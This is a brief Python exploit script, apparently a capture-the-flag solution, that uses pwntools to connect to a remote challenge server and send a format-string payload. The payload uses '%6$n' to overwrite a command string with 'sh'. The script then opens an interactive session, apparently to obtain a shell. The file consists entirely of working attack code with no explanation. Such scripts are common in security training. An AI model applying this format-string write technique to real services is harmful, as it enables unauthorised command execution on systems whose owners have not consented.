#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=2)
context.terminal = ["tmux", "splitw", "-h"]

p = remote("cytech.tcdn.casa", 4404)

sh_int = u16(b"sh")
payload = f"%{sh_int}c"  # write 'sh' bytes
payload += f"%6$n"  # ptr to safe_command is at [RSP]

p.sendlineafter(b"payload: ", payload.encode())
p.interactive()
